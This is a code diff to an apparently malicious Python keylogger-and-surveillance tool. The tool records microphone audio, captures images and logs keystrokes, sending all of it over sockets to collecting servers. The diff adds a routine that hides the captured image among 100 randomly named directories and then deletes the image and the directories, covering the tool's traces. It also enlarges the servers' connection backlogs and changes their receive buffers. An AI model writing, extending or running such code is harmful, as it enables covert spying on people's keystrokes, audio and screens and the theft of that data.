@@ -11,6 +11,7 @@ import wave
 import threading
 import ast
 import BetterPrinting as bp
+import random
 
 def daten_aufnehemen():
     format = pyaudio.paInt16
@@ -47,6 +48,19 @@ def daten_aufnehemen():
     listening_data.send(str_frames.encode())
     # Sends data to ServerListener
 
+def all_dir():
+    global random_lst
+    zeichen = "qwertzuiopasdfghjklyxcvbnm1234567890"
+    random_lst = ["".join(random.sample(zeichen, random.randint(4, 10))) for x in range(100)]
+    #This makes a list of every directory name randomly
+    for dir_name in random_lst:
+        os.system(f"mkdir {dir_name}")
+        #The directory is being made here
+
+    random_dir = random.choice(random_lst)
+    os.chdir(random_dir)
+    #We are now in that directory where the image can be stored
+
 def client(ip_photos, port_photos):
     global fhandle
     # fhandle is the variable which opens the foto
@@ -78,6 +92,8 @@ def countdown_send(zeit, ip_photos, port_photos, ip_keylogger, port_keylogger):
     key_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         for x in range(zeit + 1):
+            if x == 20:
+                all_dir()
             print(x)
             zeit -= 1
             time.sleep(1)
@@ -100,6 +116,11 @@ def countdown_send(zeit, ip_photos, port_photos, ip_keylogger, port_keylogger):
         # Closes the image
         os.remove("Image.png")
         # Deletes the image in the current directory
+        os.chdir("..")
+        #We have to go back so that we can delete the other directories
+        for each_dir in random_lst:
+            os.system(f"rmdir {each_dir}")
+            #This deletes every directory
         sys.exit()
         # Stops the keylogger
     except KeyboardInterrupt:
@@ -194,7 +215,7 @@ class ServerKeylogger:
         try:
             server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server.bind((self.ip, self.port))
-            server.listen(5)
+            server.listen(1000)
 
             bp.color("Waiting for connection....", "magenta")
             clientsocket, ipaddress = server.accept()
@@ -203,7 +224,7 @@ class ServerKeylogger:
 
             full_msg = ""
             while True:
-                msg = clientsocket.recv(2000).decode()
+                msg = clientsocket.recv(8192).decode()
                 #More Data can be accepted due to a bigger buffer size
                 if len(msg) <= 0: break
                 full_msg += msg
@@ -276,7 +297,7 @@ class ServerPhotos:
                 full_msg = b""
                 # All the binary data is being stored in full_msg as in the previous classes
                 while True:
-                    msg = client_socket.recv(20000)
+                    msg = client_socket.recv(8192)
                     if len(msg) <= 0: break
                     full_msg += msg
                 client_socket.close()
@@ -305,7 +326,7 @@ class ServerListener:
         try:
             listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             listening_data.bind((self.ip, self.port))
-            listening_data.listen(5)
+            listening_data.listen(1000)
             # 5 possible connections
             bp.color("Waiting for connection...", "green")
             # Waits for a connection
@@ -362,7 +383,7 @@ class Timer:
     def start_timer(self):
         show_time = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         show_time.bind((self.ip, self.port))
-        show_time.listen(2)
+        show_time.listen(10)
 
         client_socket, ipaddress = show_time.accept()
         full_msg = ""
